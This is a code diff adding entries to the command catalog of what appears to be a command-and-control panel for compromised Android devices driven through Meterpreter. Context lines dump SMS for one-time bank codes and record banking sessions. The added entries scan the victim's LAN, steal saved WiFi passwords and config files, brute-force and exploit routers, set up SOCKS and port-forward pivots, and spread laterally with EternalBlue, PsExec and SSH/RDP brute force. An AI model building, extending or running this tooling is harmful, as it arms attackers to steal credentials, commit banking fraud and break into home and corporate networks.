@@ -324,6 +324,48 @@ const COMMAND_CATALOG: C2Command[] = [
   { id: "fin_screen_record",   name: "run post/android/capture/screen_capture",                           category: "Finance",   description: "Capture screen during wallet/banking session" },
   { id: "fin_sms_otp",         name: "dump_sms",                                                          category: "Finance",   description: "Dump SMS for OTP codes / bank notifications" },
   { id: "fin_contacts_bank",   name: "dump_contacts",                                                     category: "Finance",   description: "Dump contacts for bank account / routing numbers" },
+
+  // ── LAN Discovery ─────────────────────────────────────────
+  { id: "net_arp_scan",        name: "run post/multi/gather/arp_scanner RHOSTS=192.168.1.0/24",           category: "Network",   description: "ARP scan local subnet — discover all LAN hosts", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },
+  { id: "net_ping_sweep",      name: "run post/multi/gather/ping_sweep RHOSTS=192.168.1.0/24",            category: "Network",   description: "ICMP ping sweep across subnet", needsParam: true, paramLabel: "CIDR", paramPlaceholder: "192.168.1.0/24" },
+  { id: "net_port_scan",       name: "run auxiliary/scanner/portscan/tcp RHOSTS=192.168.1.1 PORTS=80,443,445,22,3389", category: "Network", description: "TCP port scan through pivot", needsParam: true, paramLabel: "Host + ports", paramPlaceholder: "192.168.1.100 22,80,445" },
+  { id: "net_smb_scan",        name: "run auxiliary/scanner/smb/smb_version RHOSTS=192.168.1.0/24",       category: "Network",   description: "Scan for Windows SMB/Samba hosts" },
+  { id: "net_ssh_scan",        name: "run auxiliary/scanner/ssh/ssh_version RHOSTS=192.168.1.0/24",       category: "Network",   description: "Detect SSH-enabled hosts on LAN" },
+  { id: "net_netbios",         name: "run auxiliary/scanner/netbios/nbname RHOSTS=192.168.1.0/24",        category: "Network",   description: "NetBIOS name scan — Windows host discovery" },
+  { id: "net_udp_probe",       name: "run auxiliary/scanner/discovery/udp_probe RHOSTS=192.168.1.0/24",   category: "Network",   description: "UDP service probe for device discovery" },
+  { id: "net_mdns",            name: "run auxiliary/scanner/mdns/mdns_query RHOSTS=224.0.0.251",          category: "Network",   description: "mDNS scan — find Apple/IoT devices" },
+  { id: "net_snmp",            name: "run auxiliary/scanner/snmp/snmp_enum RHOSTS=192.168.1.0/24",        category: "Network",   description: "SNMP enumeration — routers, switches, printers" },
+
+  // ── WiFi Intelligence ─────────────────────────────────────
+  { id: "net_wifi_creds",      name: "run post/multi/gather/wifi_credentials",                            category: "Network",   description: "Dump all saved WiFi passwords from device" },
+  { id: "net_wifi_scan",       name: "execute -f /system/bin/sh -a '-c \"iwlist wlan0 scan\"'",          category: "Network",   description: "Scan nearby WiFi networks (SSID, BSSID, signal)" },
+  { id: "net_wifi_conf",       name: "download /data/misc/wifi/WifiConfigStore.xml",                     category: "Network",   description: "Download Android WiFi config store (passwords)" },
+  { id: "net_wpa_supplicant",  name: "download /data/misc/wifi/wpa_supplicant.conf",                     category: "Network",   description: "Download wpa_supplicant.conf (older Android WiFi)" },
+  { id: "net_wifi_dump_android",name:"dump_wifi",                                                          category: "Network",   description: "Meterpreter dump_wifi — saved WiFi passwords" },
+
+  // ── Router Hook ───────────────────────────────────────────
+  { id: "net_router_detect",   name: "execute -f /system/bin/sh -a '-c \"ip route | grep default\"'",   category: "Network",   description: "Detect default gateway (router IP)" },
+  { id: "net_router_brute",    name: "run auxiliary/scanner/http/http_login RHOSTS=192.168.1.1 RPORT=80 USERPASS_FILE=/usr/share/metasploit-framework/data/wordlists/router_default_userpass.txt", category: "Network", description: "Brute-force router admin with default credentials", needsParam: true, paramLabel: "Router IP", paramPlaceholder: "192.168.1.1" },
+  { id: "net_router_dns",      name: "execute -f /system/bin/sh -a '-c \"nslookup google.com 192.168.1.1\"'", category: "Network", description: "Test router DNS resolution" },
+  { id: "net_upnp",            name: "run auxiliary/scanner/upnp/ssdp_msearch RHOSTS=192.168.1.0/24",    category: "Network",   description: "UPnP/SSDP discovery — routers + IoT devices" },
+  { id: "net_router_cve_tp",   name: "run exploit/linux/http/tplink_archer_telnet_enable RHOSTS=192.168.1.1", category: "Network", description: "TP-Link Archer auth bypass + telnet enable" },
+  { id: "net_router_cve_ng",   name: "run exploit/linux/http/netgear_r7000_cgibin_exec RHOSTS=192.168.1.1",  category: "Network", description: "Netgear R7000 remote command injection CVE" },
+
+  // ── Pivot / SOCKS ─────────────────────────────────────────
+  { id: "net_autoroute",       name: "run post/multi/manage/autoroute SUBNET=192.168.1.0 NETMASK=255.255.255.0", category: "Network", description: "Setup autoroute pivot through session", needsParam: true, paramLabel: "Subnet/Mask", paramPlaceholder: "192.168.1.0 255.255.255.0" },
+  { id: "net_socks_start",     name: "use auxiliary/server/socks_proxy\nset SRVPORT 1080\nset VERSION 5\nrun -j", category: "Network", description: "Start SOCKS5 proxy through session (port 1080)" },
+  { id: "net_portfwd_add",     name: "portfwd add -l 8080 -r 192.168.1.1 -p 80",                         category: "Network",   description: "Forward local port to internal host", needsParam: true, paramLabel: "lport:rhost:rport", paramPlaceholder: "8080:192.168.1.1:80" },
+  { id: "net_portfwd_list",    name: "portfwd list",                                                      category: "Network",   description: "List all active port forwards" },
+
+  // ── Lateral Movement (Spread) ─────────────────────────────
+  { id: "net_smb_exploit",     name: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.100\nrun", category: "Network", description: "EternalBlue SMB exploit → Windows SYSTEM", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100", dangerous: true },
+  { id: "net_ssh_brute",       name: "run auxiliary/scanner/ssh/ssh_login RHOSTS=192.168.1.100 USERNAME=root PASS_FILE=/usr/share/wordlists/rockyou.txt", category: "Network", description: "SSH brute force on LAN host", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100" },
+  { id: "net_psexec",          name: "use exploit/windows/smb/psexec\nset RHOSTS 192.168.1.100\nrun",    category: "Network",   description: "PSExec lateral movement (needs SMB creds)", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100", dangerous: true },
+  { id: "net_wmi_exec",        name: "run post/windows/manage/wmic RHOSTS=192.168.1.100",                category: "Network",   description: "WMI remote execution on Windows host" },
+  { id: "net_rdp_brute",       name: "run auxiliary/scanner/rdp/rdp_login RHOSTS=192.168.1.100 USERNAME=administrator", category: "Network", description: "Brute RDP credentials on LAN target", needsParam: true, paramLabel: "Target IP", paramPlaceholder: "192.168.1.100" },
+  { id: "net_shell_to_meterp", name: "run post/multi/manage/shell_to_meterpreter",                       category: "Network",   description: "Upgrade shell session to Meterpreter" },
+  { id: "net_enum_shares",     name: "run post/windows/gather/enum_shares",                               category: "Network",   description: "Enumerate accessible SMB network shares" },
+  { id: "net_enum_computers",  name: "run post/windows/gather/enum_computers",                            category: "Network",   description: "Enumerate all computers in Active Directory domain" },
 ];
 
 export function getCommandsByCategory(): Record<string, C2Command[]> {
